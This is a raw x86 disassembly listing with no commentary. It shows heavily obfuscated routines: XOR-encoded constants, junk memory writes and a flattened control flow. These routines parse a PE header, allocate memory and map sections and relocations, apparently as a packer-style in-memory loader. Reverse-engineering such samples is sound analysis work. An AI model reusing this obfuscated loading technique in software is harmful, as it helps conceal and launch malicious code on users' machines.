  42847e:	mov    DWORD PTR [ebp-0x8],eax
  428481:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  428488:	mov    DWORD PTR [ebp-0x4],0xead71885
  42848f:	mov    DWORD PTR [ebp-0x10],0x8
  428496:	mov    ecx,ecx
  428498:	mov    eax,DWORD PTR [ebp-0xc]
  42849b:	mov    ecx,DWORD PTR [ebp-0x14]
  42849e:	xor    eax,esi
  4284a0:	xor    ecx,esi
  4284a2:	add    eax,edi
  4284a4:	add    ecx,edi
  4284a6:	imul   eax,ecx
  4284a9:	jmp    0x4284dc
  4284ab:	mov    eax,DWORD PTR [ebp-0x4]
  4284ae:	sub    eax,edi
  4284b0:	xor    eax,esi
  4284b2:	mov    DWORD PTR [ebp-0x8],eax
  4284b5:	lea    ebx,[ebp-0x8]
  4284b8:	call   0x4281fe
  4284bd:	mov    DWORD PTR [ebp-0x8],eax
  4284c0:	mov    eax,DWORD PTR [ebp-0x8]
  4284c3:	mov    ecx,DWORD PTR [ebp-0x4]
  4284c6:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4284cd:	mov    eax,DWORD PTR [ebp-0xc]
  4284d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4284d3:	xor    eax,esi
  4284d5:	lea    eax,[eax+ecx*1+0x3272f1]
  4284dc:	mov    DWORD PTR [ebp-0x4],eax
  4284df:	mov    eax,DWORD PTR [ebp-0x18]
  4284e2:	mov    ecx,DWORD PTR [ebp-0xc]
  4284e5:	xor    ecx,esi
  4284e7:	xor    eax,esi
  4284e9:	sub    eax,ecx
  4284eb:	mov    ecx,DWORD PTR [ebp-0x4]
  4284ee:	cmp    ecx,eax
  4284f0:	jbe    0x4284ab
  4284f2:	mov    eax,DWORD PTR [ebp-0x1c]
  4284f5:	xor    eax,esi
  4284f7:	add    eax,edi
  4284f9:	mov    DWORD PTR [ebp-0x8],eax
  4284fc:	mov    DWORD PTR [ebp-0x18],0xf89c86a4
  428503:	mov    ebx,ebx
  428505:	jmp    0x428568
  428507:	mov    ecx,DWORD PTR [ebp-0x20]
  42850a:	mov    eax,DWORD PTR [ebp-0x8]
  42850d:	xor    ecx,esi
  42850f:	add    ecx,edi
  428511:	shr    eax,cl
  428513:	mov    DWORD PTR [ebp-0x4],eax
  428516:	mov    eax,DWORD PTR [ebp+0x8]
  428519:	mov    cl,BYTE PTR [eax]
  42851b:	mov    BYTE PTR [ebp+0xb],cl
  42851e:	mov    cl,BYTE PTR [ebp+0xb]
  428521:	mov    edx,DWORD PTR [ebp-0x8]
  428524:	movzx  ecx,cl
  428527:	xor    ecx,edx
  428529:	mov    DWORD PTR [ebp+0x8],ecx
  42852c:	mov    ecx,DWORD PTR [ebp-0x18]
  42852f:	mov    edx,DWORD PTR [ebp+0x8]
  428532:	xor    ecx,esi
  428534:	add    ecx,edi
  428536:	and    ecx,edx
  428538:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  42853f:	mov    edx,DWORD PTR [ebp-0x4]
  428542:	xor    ecx,edx
  428544:	mov    DWORD PTR [ebp-0x8],ecx
  428547:	mov    ecx,DWORD PTR [ebp-0xc]
  42854a:	xor    ecx,esi
  42854c:	lea    eax,[eax+ecx*1+0x3272f1]
  428553:	mov    DWORD PTR [ebp+0x8],eax
  428556:	mov    eax,DWORD PTR [ebp-0xc]
  428559:	xor    eax,esi
  42855b:	mov    ecx,0xffcd8d0f
  428560:	sub    ecx,eax
  428562:	add    ecx,DWORD PTR [ebp-0x10]
  428565:	mov    DWORD PTR [ebp-0x10],ecx
  428568:	mov    eax,DWORD PTR [ebp-0x14]
  42856b:	mov    ecx,DWORD PTR [ebp-0x10]
  42856e:	xor    eax,esi
  428570:	add    eax,edi
  428572:	cmp    ecx,eax
  428574:	jne    0x428507
  428576:	mov    eax,DWORD PTR [ebp-0x1c]
  428579:	mov    ecx,DWORD PTR [ebp-0x8]
  42857c:	xor    eax,esi
  42857e:	add    eax,edi
  428580:	pop    edi
  428581:	pop    esi
  428582:	xor    eax,ecx
  428584:	pop    ebx
  428585:	leave  
  428586:	ret    0x4
  428589:	push   ebp
  42858a:	mov    ebp,esp
  42858c:	mov    eax,DWORD PTR [ebp+0x1c]
  42858f:	mov    ecx,DWORD PTR [ebp+0x8]
  428592:	mov    edx,DWORD PTR [ebp+0x10]
  428595:	mov    eax,DWORD PTR [eax+0x190]
  42859b:	mov    eax,DWORD PTR [eax]
  42859d:	sub    esp,0x64
  4285a0:	push   ebx
  4285a1:	push   esi
  4285a2:	push   edi
  4285a3:	mov    edi,0x75108aa
  4285a8:	xor    ecx,edi
  4285aa:	mov    ebx,0x3272f1
  4285af:	add    ecx,ebx
  4285b1:	cmp    ecx,edx
  4285b3:	jne    0x4285c4
  4285b5:	or     DWORD PTR ds:0x3750c3f,0x4263eb2c
  4285bf:	jmp    0x428ac0
  4285c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4285c7:	mov    esi,DWORD PTR [ebp+0x14]
  4285ca:	mov    edx,DWORD PTR [esi]
  4285cc:	xor    ecx,edi
  4285ce:	add    ecx,ebx
  4285d0:	cmp    edx,ecx
  4285d2:	je     0x428a7b
  4285d8:	mov    ecx,DWORD PTR [ebp+0x1c]
  4285db:	mov    DWORD PTR [ebp-0x1c],eax
  4285de:	mov    DWORD PTR [ebp+0x1c],ecx
  4285e1:	mov    ecx,DWORD PTR [ebp+0x18]
  4285e4:	mov    eax,DWORD PTR [esi]
  4285e6:	mov    DWORD PTR [ebp-0x20],eax
  4285e9:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4285f0:	mov    edx,0xf89c85ba
  4285f5:	mov    DWORD PTR [ebp-0x8],edx
  4285f8:	mov    eax,DWORD PTR [ebp+0x1c]
  4285fb:	mov    DWORD PTR [ebp+0x1c],eax
  4285fe:	mov    eax,DWORD PTR [ebp+0x1c]
  428601:	mov    eax,DWORD PTR [eax+0x190]
  428607:	mov    eax,DWORD PTR [eax]
  428609:	mov    DWORD PTR [ebp-0x24],ecx
  42860c:	mov    ecx,DWORD PTR [ebp+0x1c]
  42860f:	mov    ecx,DWORD PTR [ecx+0x190]
  428615:	mov    ecx,DWORD PTR [ecx]
  428617:	add    ecx,DWORD PTR [eax+0x3c]
  42861a:	mov    DWORD PTR [ebp+0x10],ecx
  42861d:	mov    eax,DWORD PTR [ebp+0x8]
  428620:	xor    eax,edi
  428622:	add    eax,ebx
  428624:	mov    DWORD PTR [ebp-0x4],eax
  428627:	mov    eax,DWORD PTR [ebp+0x8]
  42862a:	xor    eax,edi
  42862c:	add    eax,ebx
  42862e:	mov    DWORD PTR [ebp+0x18],eax
  428631:	mov    eax,DWORD PTR [ebp+0x10]
  428634:	mov    eax,DWORD PTR [eax+0x50]
  428637:	sub    eax,0xc
  42863a:	mov    DWORD PTR [ebp-0x28],eax
  42863d:	mov    eax,DWORD PTR [ebp+0x10]
  428640:	mov    eax,DWORD PTR [eax+0x38]
  428643:	mov    ecx,DWORD PTR [ebp+0x10]
  428646:	dec    eax
  428647:	test   DWORD PTR [ecx+0x54],eax
  42864a:	mov    eax,DWORD PTR [ebp+0x10]
  42864d:	je     0x428667
  42864f:	mov    eax,DWORD PTR [eax+0x38]
  428652:	mov    ecx,DWORD PTR [ebp+0x10]
  428655:	mov    ecx,DWORD PTR [ecx+0x54]
  428658:	dec    eax
  428659:	not    eax
  42865b:	and    ecx,eax
  42865d:	mov    eax,DWORD PTR [ebp+0x10]
  428660:	mov    eax,DWORD PTR [eax+0x38]
  428663:	add    eax,ecx
  428665:	jmp    0x42866a
  428667:	mov    eax,DWORD PTR [eax+0x54]
  42866a:	mov    DWORD PTR [ebp+0x1c],eax
  42866d:	mov    eax,DWORD PTR [ebp+0x8]
  428670:	xor    eax,edi
  428672:	add    eax,ebx
  428674:	mov    DWORD PTR [ebp+0x18],eax
  428677:	mov    eax,DWORD PTR [ebp+0x8]
  42867a:	xor    eax,edi
  42867c:	add    eax,ebx
  42867e:	mov    DWORD PTR [ebp+0x18],eax
  428681:	mov    eax,DWORD PTR [ebp+0x8]
  428684:	mov    ecx,DWORD PTR [ebp-0x24]
  428687:	xor    eax,edi
  428689:	add    eax,ebx
  42868b:	mov    DWORD PTR [ecx],eax
  42868d:	mov    DWORD PTR [ebp+0x18],edx
  428690:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  428697:	mov    DWORD PTR [ebp+0x18],0xf89c85b8
  42869e:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  4286a5:	mov    eax,DWORD PTR [ebp-0x8]
  4286a8:	mov    ecx,DWORD PTR [ebp+0x1c]
  4286ab:	xor    eax,edi
  4286ad:	add    eax,ebx
  4286af:	imul   eax,ecx
  4286b2:	mov    ecx,DWORD PTR [ebp+0x8]
  4286b5:	mov    edx,DWORD PTR [ebp-0x28]
  4286b8:	xor    ecx,edi
  4286ba:	lea    ecx,[ecx+edx*1+0x3272f1]
  4286c1:	cmp    eax,ecx
  4286c3:	jae    0x428a74
  4286c9:	mov    eax,DWORD PTR [ebp+0x8]
  4286cc:	xor    eax,edi
  4286ce:	add    eax,ebx
  4286d0:	mov    DWORD PTR [ebp+0x18],eax
  4286d3:	mov    eax,DWORD PTR [ebp+0x1c]
  4286d6:	add    eax,DWORD PTR [ebp-0x1c]
  4286d9:	mov    DWORD PTR [ebp-0x4],eax
  4286dc:	push   DWORD PTR [ebp-0x4]
  4286df:	mov    esi,DWORD PTR [ebp-0x1c]
  4286e2:	mov    ecx,DWORD PTR [ebp+0x10]
  4286e5:	call   0x427839
  4286ea:	mov    DWORD PTR [ebp+0xc],eax
  4286ed:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4286f4:	mov    eax,DWORD PTR [ebp-0x18]
  4286f7:	xor    eax,edi
  4286f9:	lea    ecx,[ebp-0x40]
  4286fc:	add    eax,ebx
  4286fe:	push   ecx
  4286ff:	call   0x427dcb
  428704:	mov    eax,DWORD PTR [ebp+0xc]
  428707:	test   eax,eax
  428709:	je     0x428759
  42870b:	mov    eax,DWORD PTR [ebp-0x18]
  42870e:	xor    eax,edi
  428710:	add    eax,ebx
  428712:	push   eax
  428713:	push   DWORD PTR [ebp+0xc]
  428716:	lea    eax,[ebp-0x40]
  428719:	push   eax
  42871a:	call   0x427cc1
  42871f:	mov    eax,DWORD PTR [ebp-0x4]
  428722:	mov    DWORD PTR [ebp-0x18],eax
  428725:	mov    eax,DWORD PTR [ebp-0x18]
  428728:	mov    ecx,DWORD PTR [ebp-0x1c]
  42872b:	sub    eax,ecx
  42872d:	mov    DWORD PTR [ebp-0x18],eax
  428730:	mov    eax,DWORD PTR [ebp+0xc]
  428733:	mov    ecx,DWORD PTR [ebp+0xc]
  428736:	mov    eax,DWORD PTR [eax+0x10]
  428739:	add    eax,DWORD PTR [ecx+0xc]
  42873c:	mov    ecx,DWORD PTR [ebp-0x18]
  42873f:	cmp    ecx,eax
  428741:	jb     0x428759
  428743:	mov    eax,DWORD PTR [ebp+0xc]
  428746:	mov    eax,DWORD PTR [eax+0xc]
  428749:	mov    ecx,DWORD PTR [ebp+0xc]
  42874c:	add    eax,DWORD PTR [ecx+0x8]
  42874f:	mov    ecx,DWORD PTR [ebp-0x18]
  428752:	sub    eax,ecx
  428754:	jmp    0x428a47
  428759:	push   0xc
  42875b:	push   DWORD PTR [ebp-0x4]
  42875e:	lea    eax,[ebp-0x4c]
  428761:	push   eax
  428762:	call   0x427cc1
  428767:	mov    eax,0xf89c85a5
  42876c:	mov    DWORD PTR [ebp-0x2c],eax
  42876f:	mov    DWORD PTR [ebp-0x30],0xf89c85ba
  428776:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  42877d:	mov    DWORD PTR [ebp-0x38],0xf89c85b8
  428784:	lea    ecx,[ebp-0x2c]
  428787:	mov    DWORD PTR [ebp-0xc],ecx
  42878a:	lea    ecx,[ebp-0x30]
  42878d:	mov    DWORD PTR [ebp-0x10],ecx
  428790:	lea    ecx,[ebp-0x34]
  428793:	mov    DWORD PTR [ebp+0xc],ecx
  428796:	lea    ecx,[ebp-0x38]
  428799:	mov    DWORD PTR [ebp-0x14],ecx
  42879c:	mov    ecx,DWORD PTR [ebp+0x8]
  42879f:	xor    ecx,edi
  4287a1:	add    ecx,ebx
  4287a3:	mov    DWORD PTR [ebp-0x18],ecx
  4287a6:	jmp    0x4289a2
  4287ab:	cmp    eax,0xf89c85bb
  4287b0:	je     0x4289b4
  4287b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4287b9:	xor    ecx,edi
  4287bb:	mov    esi,eax
  4287bd:	add    ecx,ebx
  4287bf:	mov    DWORD PTR [ebp+0x18],ecx
  4287c2:	mov    eax,DWORD PTR [ebp-0x18]
  4287c5:	xor    esi,edi
  4287c7:	lea    eax,[eax+esi*1+0x3272f1]
  4287ce:	mov    DWORD PTR [ebp-0x18],eax
  4287d1:	mov    eax,DWORD PTR [ebp-0x8]
  4287d4:	mov    ecx,DWORD PTR [ebp-0x18]
  4287d7:	xor    eax,edi
  4287d9:	add    eax,ebx
  4287db:	cmp    ecx,eax
  4287dd:	jne    0x4287f2
  4287df:	mov    eax,DWORD PTR [ebp+0x8]
  4287e2:	xor    eax,edi
  4287e4:	add    eax,ebx
  4287e6:	push   eax
  4287e7:	push   0xc
  4287e9:	lea    eax,[ebp-0x4c]
  4287ec:	push   eax
  4287ed:	call   0x4282a6
  4287f2:	mov    eax,DWORD PTR [ebp-0xc]
  4287f5:	mov    eax,DWORD PTR [eax]
  4287f7:	xor    eax,edi
  4287f9:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428800:	mov    ecx,DWORD PTR [ebp+0x8]
  428803:	xor    ecx,edi
  428805:	movzx  eax,al
  428808:	add    ecx,ebx
  42880a:	cmp    eax,ecx
  42880c:	je     0x42898a
  428812:	mov    eax,DWORD PTR [ebp-0x10]
  428815:	mov    eax,DWORD PTR [eax]
  428817:	xor    eax,edi
  428819:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428820:	mov    ecx,DWORD PTR [ebp+0x8]
  428823:	xor    ecx,edi
  428825:	movzx  eax,al
  428828:	add    ecx,ebx
  42882a:	cmp    eax,ecx
  42882c:	je     0x42898a
  428832:	mov    eax,DWORD PTR [ebp+0xc]
  428835:	mov    eax,DWORD PTR [eax]
  428837:	xor    eax,edi
  428839:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428840:	mov    ecx,DWORD PTR [ebp+0x8]
  428843:	xor    ecx,edi
  428845:	movzx  eax,al
  428848:	add    ecx,ebx
  42884a:	cmp    eax,ecx
  42884c:	je     0x42898a
  428852:	mov    eax,DWORD PTR [ebp-0x14]
  428855:	mov    eax,DWORD PTR [eax]
  428857:	xor    eax,edi
  428859:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428860:	mov    ecx,DWORD PTR [ebp+0x8]
  428863:	xor    ecx,edi
  428865:	movzx  eax,al
  428868:	add    ecx,ebx
  42886a:	cmp    eax,ecx
  42886c:	je     0x42898a
  428872:	mov    eax,DWORD PTR [ebp-0x10]
  428875:	mov    eax,DWORD PTR [eax]
  428877:	xor    eax,edi
  428879:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428880:	mov    ecx,DWORD PTR [ebp-0xc]
  428883:	mov    ecx,DWORD PTR [ecx]
  428885:	xor    ecx,edi
  428887:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  42888e:	xor    al,cl
  428890:	mov    ecx,DWORD PTR [ebp+0xc]
  428893:	mov    ecx,DWORD PTR [ecx]
  428895:	xor    ecx,edi
  428897:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  42889e:	or     al,cl
  4288a0:	mov    ecx,DWORD PTR [ebp-0xc]
  4288a3:	mov    ecx,DWORD PTR [ecx]
  4288a5:	xor    ecx,edi
  4288a7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4288ae:	cmp    cl,al
  4288b0:	jne    0x42898a
  4288b6:	mov    eax,DWORD PTR [ebp+0xc]
  4288b9:	mov    eax,DWORD PTR [eax]
  4288bb:	xor    eax,edi
  4288bd:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  4288c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4288c7:	mov    ecx,DWORD PTR [ecx]
  4288c9:	xor    ecx,edi
  4288cb:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288d2:	xor    al,cl
  4288d4:	mov    ecx,DWORD PTR [ebp-0x14]
  4288d7:	mov    ecx,DWORD PTR [ecx]
  4288d9:	xor    ecx,edi
  4288db:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  4288e2:	or     al,cl
  4288e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4288e7:	mov    ecx,DWORD PTR [ecx]
  4288e9:	xor    ecx,edi
  4288eb:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  4288f2:	cmp    cl,al
  4288f4:	jne    0x42898a
  4288fa:	mov    eax,DWORD PTR [ebp-0x14]
  4288fd:	mov    eax,DWORD PTR [eax]
  4288ff:	xor    eax,edi
  428901:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428908:	mov    ecx,DWORD PTR [ebp+0xc]
  42890b:	mov    ecx,DWORD PTR [ecx]
  42890d:	xor    ecx,edi
  42890f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428916:	xor    al,cl
  428918:	mov    ecx,DWORD PTR [ebp-0xc]
  42891b:	mov    ecx,DWORD PTR [ecx]
  42891d:	xor    ecx,edi
  42891f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428926:	or     al,cl
  428928:	mov    ecx,DWORD PTR [ebp+0xc]
  42892b:	mov    ecx,DWORD PTR [ecx]
  42892d:	xor    ecx,edi
  42892f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428936:	cmp    cl,al
  428938:	jne    0x42898a
  42893a:	mov    eax,DWORD PTR [ebp-0x14]
  42893d:	mov    eax,DWORD PTR [eax]
  42893f:	xor    eax,edi
  428941:	mov    al,BYTE PTR [ebp+eax*1+0x3272a5]
  428948:	mov    ecx,DWORD PTR [ebp-0xc]
  42894b:	mov    ecx,DWORD PTR [ecx]
  42894d:	xor    ecx,edi
  42894f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428956:	xor    al,cl
  428958:	mov    ecx,DWORD PTR [ebp-0x10]
  42895b:	mov    ecx,DWORD PTR [ecx]
  42895d:	xor    ecx,edi
  42895f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a5]
  428966:	or     al,cl
  428968:	mov    ecx,DWORD PTR [ebp-0x14]
  42896b:	mov    ecx,DWORD PTR [ecx]
  42896d:	xor    ecx,edi
  42896f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272a9]
  428976:	cmp    cl,al
  428978:	jne    0x42898a
  42897a:	lea    eax,[ebp-0x4c]
  42897d:	push   eax
  42897e:	call   0x428445
  428983:	mov    ecx,DWORD PTR [ebp-0x44]
  428986:	cmp    eax,ecx
  428988:	je     0x428994
  42898a:	mov    eax,DWORD PTR [ebp+0x8]
  42898d:	xor    eax,edi
  42898f:	add    eax,ebx
  428991:	mov    DWORD PTR [ebp+0x18],eax
  428994:	mov    eax,DWORD PTR [ebp-0x8]
  428997:	xor    eax,edi
  428999:	lea    eax,[eax+esi*1+0x3272f1]
  4289a0:	xor    eax,edi
  4289a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4289a5:	mov    edx,DWORD PTR [ebp+0x18]
  4289a8:	xor    ecx,edi
  4289aa:	add    ecx,ebx
  4289ac:	cmp    edx,ecx
  4289ae:	je     0x4287ab
  4289b4:	mov    eax,DWORD PTR [ebp+0x8]
  4289b7:	mov    ecx,DWORD PTR [ebp+0x18]
  4289ba:	xor    eax,edi
  4289bc:	add    eax,ebx
  4289be:	cmp    ecx,eax
  4289c0:	jne    0x4289d3
  4289c2:	mov    eax,DWORD PTR [ebp-0x8]
  4289c5:	mov    ecx,DWORD PTR [ebp+0x1c]
  4289c8:	xor    eax,edi
  4289ca:	lea    eax,[eax+ecx*1+0x3272f1]
  4289d1:	jmp    0x428a4a
  4289d3:	push   0x18
  4289d5:	push   DWORD PTR [ebp-0x4]
  4289d8:	lea    eax,[ebp-0x64]
  4289db:	push   eax
  4289dc:	call   0x427cc1
  4289e1:	mov    eax,DWORD PTR [ebp+0x8]
  4289e4:	mov    ecx,DWORD PTR [ebp-0x18]
  4289e7:	xor    eax,edi
  4289e9:	add    eax,ebx
  4289eb:	cmp    eax,ecx
  4289ed:	je     0x428a02
  4289ef:	mov    eax,DWORD PTR [ebp+0x8]
  4289f2:	xor    eax,edi
  4289f4:	add    eax,ebx
  4289f6:	push   eax
  4289f7:	push   0x18
  4289f9:	lea    eax,[ebp-0x64]
  4289fc:	push   eax
  4289fd:	call   0x4282a6
  428a02:	mov    eax,DWORD PTR [ebp-0x4]
  428a05:	add    eax,0x18
  428a08:	mov    DWORD PTR [ebp+0x18],eax
  428a0b:	push   DWORD PTR [ebp-0x50]
  428a0e:	push   DWORD PTR [ebp+0x18]
  428a11:	mov    eax,DWORD PTR [ebp-0x54]
  428a14:	add    eax,DWORD PTR [ebp-0x20]
  428a17:	push   eax
  428a18:	call   0x427cc1
  428a1d:	mov    eax,DWORD PTR [ebp+0x8]
  428a20:	mov    ecx,DWORD PTR [ebp-0x18]
  428a23:	xor    eax,edi
  428a25:	add    eax,ebx
  428a27:	cmp    eax,ecx
  428a29:	je     0x428a3c
  428a2b:	push   0x0
  428a2d:	push   DWORD PTR [ebp-0x50]
  428a30:	mov    eax,DWORD PTR [ebp-0x54]
  428a33:	add    eax,DWORD PTR [ebp-0x20]
  428a36:	push   eax
  428a37:	call   0x4282a6
  428a3c:	mov    eax,DWORD PTR [ebp-0x24]
  428a3f:	mov    ecx,DWORD PTR [ebp-0x50]
  428a42:	add    DWORD PTR [eax],ecx
  428a44:	mov    eax,DWORD PTR [ebp-0x50]
  428a47:	add    eax,DWORD PTR [ebp+0x1c]
  428a4a:	mov    DWORD PTR [ebp+0x1c],eax
  428a4d:	mov    eax,DWORD PTR [ebp-0x8]
  428a50:	mov    ecx,DWORD PTR [ebp+0x1c]
  428a53:	xor    eax,edi
  428a55:	add    eax,ebx
  428a57:	imul   eax,ecx
  428a5a:	mov    ecx,DWORD PTR [ebp+0x8]
  428a5d:	mov    edx,DWORD PTR [ebp-0x28]
  428a60:	xor    ecx,edi
  428a62:	lea    ecx,[ecx+edx*1+0x3272f1]
  428a69:	cmp    eax,ecx
  428a6b:	jb     0x4286c9
  428a71:	mov    esi,DWORD PTR [ebp+0x14]
  428a74:	mov    eax,DWORD PTR [ebp-0x20]
  428a77:	mov    DWORD PTR [esi],eax
  428a79:	jmp    0x428ac0
  428a7b:	mov    ecx,DWORD PTR [ebp+0x8]
  428a7e:	mov    edx,DWORD PTR [ebp+0xc]
  428a81:	xor    ecx,edi
  428a83:	xor    edx,edi
  428a85:	add    ecx,ebx
  428a87:	add    edx,ebx
  428a89:	cmp    ecx,edx
  428a8b:	jne    0x428a9f
  428a8d:	mov    eax,ds:0x7f642ddc
  428a92:	imul   eax,eax,0x9f15fccf
  428a98:	mov    ds:0x7f642ddc,eax
  428a9d:	jmp    0x428ac0
  428a9f:	mov    ecx,DWORD PTR [ebp+0x8]
  428aa2:	xor    ecx,edi
  428aa4:	add    ecx,ebx
  428aa6:	cmp    eax,ecx
  428aa8:	je     0x428ab6
  428aaa:	sub    DWORD PTR ds:0xf861e3c,0x709beac4
  428ab4:	jmp    0x428ac0
  428ab6:	and    DWORD PTR ds:0x3343fadc,0x5265ec3f
  428ac0:	pop    edi
  428ac1:	pop    esi
  428ac2:	pop    ebx
  428ac3:	leave  
  428ac4:	ret    0x18
  428ac7:	push   ebp
  428ac8:	mov    ebp,esp
  428aca:	and    esp,0xfffffff8
  428acd:	mov    eax,DWORD PTR [ebp+0x20]
  428ad0:	sub    esp,0x14
  428ad3:	push   ebx
  428ad4:	mov    ebx,DWORD PTR [ebp+0x14]
  428ad7:	push   esi
  428ad8:	push   edi
  428ad9:	cmp    eax,0xf89c85a5
  428ade:	jne    0x428aea
  428ae0:	push   0xf89c85ba
  428ae5:	jmp    0x428c1c
  428aea:	mov    eax,DWORD PTR [ebp+0x20]
  428aed:	cmp    eax,0xf89c85ba
  428af2:	jne    0x428afe
  428af4:	push   0xf89c85bb
  428af9:	jmp    0x428c1c
  428afe:	mov    eax,DWORD PTR [ebp+0x20]
  428b01:	cmp    eax,0xf89c85bb
  428b06:	jne    0x428b12
  428b08:	push   0xf89c85b8
  428b0d:	jmp    0x428c1c
  428b12:	mov    eax,DWORD PTR [ebp+0x20]
  428b15:	cmp    eax,0xf89c85b8
  428b1a:	jne    0x428b26
  428b1c:	push   0xf89c85b9
  428b21:	jmp    0x428c1c
  428b26:	mov    ecx,DWORD PTR [ebp+0x20]
  428b29:	mov    eax,0xf89c85bc
  428b2e:	cmp    ecx,eax
  428b30:	jne    0x428bec
  428b36:	mov    eax,DWORD PTR [ebp+0x10]
  428b39:	mov    DWORD PTR [esp+0xc],eax
  428b3d:	mov    eax,DWORD PTR [ebp+0x18]
  428b40:	mov    DWORD PTR [esp+0x14],eax
  428b44:	mov    eax,DWORD PTR [ebp+0xc]
  428b47:	mov    DWORD PTR [esp+0x18],eax
  428b4b:	mov    eax,DWORD PTR [ebp+0x8]
  428b4e:	mov    DWORD PTR [esp+0x10],eax
  428b52:	mov    eax,DWORD PTR [esp+0x10]
  428b56:	mov    ecx,DWORD PTR [esp+0x14]
  428b5a:	mov    edi,0x75108aa
  428b5f:	xor    eax,edi
  428b61:	mov    esi,0x3272f1
  428b66:	add    eax,esi
  428b68:	mov    DWORD PTR [ecx],eax
  428b6a:	mov    eax,DWORD PTR [esp+0xc]
  428b6e:	mov    eax,DWORD PTR [eax+0x194]
  428b74:	mov    ecx,DWORD PTR [eax]
  428b76:	mov    eax,DWORD PTR [esp+0xc]
  428b7a:	mov    eax,DWORD PTR [eax+0x194]
  428b80:	mov    eax,DWORD PTR [eax]
  428b82:	add    eax,DWORD PTR [ecx+0x3c]
  428b85:	mov    ecx,DWORD PTR [esp+0xc]
  428b89:	mov    ecx,DWORD PTR [ecx+0x1e0]
  428b8f:	mov    ecx,DWORD PTR [ecx+0x14]
  428b92:	push   0x4
  428b94:	push   0x3000
  428b99:	push   DWORD PTR [eax+0x50]
  428b9c:	push   0x0
  428b9e:	call   ecx
  428ba0:	mov    DWORD PTR [ebx],eax
  428ba2:	mov    eax,DWORD PTR [esp+0x10]
  428ba6:	push   DWORD PTR [esp+0xc]
  428baa:	xor    eax,edi
  428bac:	add    eax,esi
  428bae:	mov    DWORD PTR [esp+0x20],eax
  428bb2:	lea    eax,[esp+0x20]
  428bb6:	push   eax
  428bb7:	push   ebx
  428bb8:	push   DWORD PTR [esp+0x20]
  428bbc:	push   DWORD PTR [esp+0x28]
  428bc0:	push   DWORD PTR [esp+0x24]
  428bc4:	call   0x428589
  428bc9:	mov    eax,DWORD PTR [esp+0x10]
  428bcd:	mov    ecx,DWORD PTR [ebx]
  428bcf:	xor    eax,edi
  428bd1:	add    eax,esi
  428bd3:	cmp    ecx,eax
  428bd5:	je     0x428c33
  428bd7:	mov    eax,DWORD PTR [esp+0x18]
  428bdb:	mov    ecx,DWORD PTR [esp+0x14]
  428bdf:	xor    eax,edi
  428be1:	add    eax,esi
  428be3:	imul   eax,DWORD PTR [esp+0x1c]
  428be8:	mov    DWORD PTR [ecx],eax
  428bea:	jmp    0x428c33
  428bec:	mov    ecx,DWORD PTR [ebp+0x20]
  428bef:	cmp    ecx,0xf89c85b9
  428bf5:	jne    0x428bfe
  428bf7:	push   0xf89c85be
  428bfc:	jmp    0x428c1c
  428bfe:	mov    ecx,DWORD PTR [ebp+0x20]
  428c01:	cmp    ecx,0xf89c85be
  428c07:	jne    0x428c10
  428c09:	push   0xf89c85bf
  428c0e:	jmp    0x428c1c
  428c10:	mov    ecx,DWORD PTR [ebp+0x20]
  428c13:	cmp    ecx,0xf89c85bf
  428c19:	jne    0x428c33
  428c1b:	push   eax
  428c1c:	push   DWORD PTR [ebp+0x1c]
  428c1f:	push   DWORD PTR [ebp+0x18]
  428c22:	push   ebx
  428c23:	push   DWORD PTR [ebp+0x10]
  428c26:	push   DWORD PTR [ebp+0xc]
  428c29:	push   DWORD PTR [ebp+0x8]
  428c2c:	call   0x428ac7
  428c31:	mov    DWORD PTR [ebx],eax
  428c33:	mov    eax,DWORD PTR [ebx]
  428c35:	pop    edi
  428c36:	pop    esi
  428c37:	pop    ebx
  428c38:	mov    esp,ebp
  428c3a:	pop    ebp
  428c3b:	ret    0x1c
  428c3e:	push   ebp
  428c3f:	mov    ebp,esp
  428c41:	sub    esp,0xc
  428c44:	mov    eax,0xf89c85a5
  428c49:	mov    DWORD PTR [ebp-0x8],eax
  428c4c:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  428c53:	mov    ecx,DWORD PTR [ebp-0x8]
  428c56:	xor    ecx,0x75108aa
  428c5c:	add    ecx,0x3272f1
  428c62:	mov    DWORD PTR [ebp-0x4],ecx
  428c65:	mov    ecx,DWORD PTR [ebp+0xc]
  428c68:	push   eax
  428c69:	mov    DWORD PTR [ebp+0xc],ecx
  428c6c:	push   DWORD PTR [ebp+0xc]
  428c6f:	lea    eax,[ebp-0x4]
  428c72:	push   DWORD PTR [ebp+0x8]
  428c75:	push   eax
  428c76:	push   DWORD PTR [ebp+0xc]
  428c79:	push   DWORD PTR [ebp-0xc]
  428c7c:	push   DWORD PTR [ebp-0x8]
  428c7f:	call   0x428ac7
